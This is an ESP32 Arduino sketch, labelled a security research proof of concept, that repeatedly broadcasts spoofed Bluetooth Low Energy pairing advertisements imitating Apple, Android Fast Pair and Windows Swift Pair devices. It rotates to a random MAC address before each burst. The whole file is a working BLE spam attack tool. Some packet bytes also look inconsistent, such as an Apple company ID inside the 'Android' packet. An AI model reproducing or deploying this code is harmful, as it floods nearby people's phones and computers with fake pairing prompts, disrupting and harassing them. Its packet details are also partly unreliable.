#include <Arduino.h>
#include <NimBLEDevice.h>
#include "esp_random.h"

NimBLEAdvertising *pAdvertising;

// 1. APPLE PACKET
uint8_t apple_packet[] = {
  0x1e, 0xff, 0x4c, 0x00, 0x07, 0x1d, 0x01, 0x04,
  0x20, 0x10, 0x02, 0x44, 0x61, 0x6e, 0x69, 0x65,
  0x6c, 0x20, 0x41, 0x69, 0x72, 0x50, 0x6f, 0x70,
  0x73, 0x20, 0x4d, 0x61, 0x78, 0x00, 0x00, 0x00
};

// 2. ANDROID PACKET
uint8_t android_packet[] = {
  0x02, 0x01, 0x06,
  0x03, 0x02, 0x2C, 0xFE,
  0x06, 0xFF, 0x4C, 0x00,
  0x02, 0x00, 0x02, 0x01,
  0x00, 0x00, 0x00, 0x00
};

// 3. WINDOWS PACKET
uint8_t windows_packet[] = {
  0x1e, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x4d,
  0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74,
  0x20, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void setRandomMac() {
  uint8_t randMac[6];
  esp_fill_random(randMac, 6);
  randMac[0] |= 0xC0; // Random Static address rule (BLE Spec)

  // Controller level random address setting for NimBLE
  ble_hs_id_set_rnd(randMac);
  NimBLEDevice::setOwnAddrType(BLE_ADDR_RANDOM);
}

void setup() {
  Serial.begin(115200);
  Serial.println("NimBLE security research PoC starting...");

  NimBLEDevice::init("");
  pAdvertising = NimBLEDevice::getAdvertising();
}

void sendPayloadWithRandomMac(uint8_t* payload, size_t len) {
  pAdvertising->stop();

  setRandomMac();

  NimBLEAdvertisementData advert;
  advert.setManufacturerData(std::string((char*)payload, len));
  pAdvertising->setAdvertisementData(advert);

  pAdvertising->start();
}

void loop() {
  Serial.println("Broadcasting Apple payload...");
  sendPayloadWithRandomMac(apple_packet, sizeof(apple_packet));
  delay(300);

  Serial.println("Broadcasting Android payload...");
  sendPayloadWithRandomMac(android_packet, sizeof(android_packet));
  delay(300);

  Serial.println("Broadcasting Windows payload...");
  sendPayloadWithRandomMac(windows_packet, sizeof(windows_packet));
  delay(300);
}
